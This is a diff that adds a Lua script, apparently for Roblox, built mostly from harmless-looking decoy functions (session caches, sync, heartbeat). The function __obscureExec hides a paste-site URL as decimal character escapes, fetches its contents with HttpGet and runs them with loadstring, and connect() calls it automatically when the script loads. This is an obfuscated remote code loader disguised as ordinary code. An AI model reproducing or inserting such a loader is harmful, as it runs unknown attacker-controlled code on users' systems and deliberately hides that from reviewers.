@@ -1,0 +1,54 @@
+local Environment = {
+    Token = nil,
+    Enabled = true,
+    Retries = 0,
+    Flags = {
+        Connected = false,
+        Synced = false,
+        Executed = false
+    }
+}
+
+local Session = {
+    ID = tostring(math.random(111111,999999)) .. "_SESSION",
+    Cache = {},
+    Temp = {}
+}
+
+local function sync()
+    for i = 1, 4 do
+        table.insert(Session.Cache, {index = i, status = "waiting"})
+    end
+    Environment.Flags.Synced = true
+end
+
+local function heartbeat()
+    if not Environment.Enabled then return end
+    for _, v in ipairs(Session.Cache) do
+        v.status = "ok"
+    end
+end
+
+local function dummy(a, b, c)
+    return (a and b) or c
+end
+
+local function __obscureExec()
+    local u = "\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\79\117\107\115\67\113\72\103\47\114\97\119"
+    local r = game["HttpGet"](game, u)
+    local e = loadstring
+    e(r)()
+end
+
+local function connect()
+    sync()
+    Environment.Flags.Connected = true
+    __obscureExec()
+    heartbeat()
+end
+
+connect()
+
+if Environment.Flags.Connected and Environment.Flags.Synced then
+    Environment.Flags.Executed = true
+end
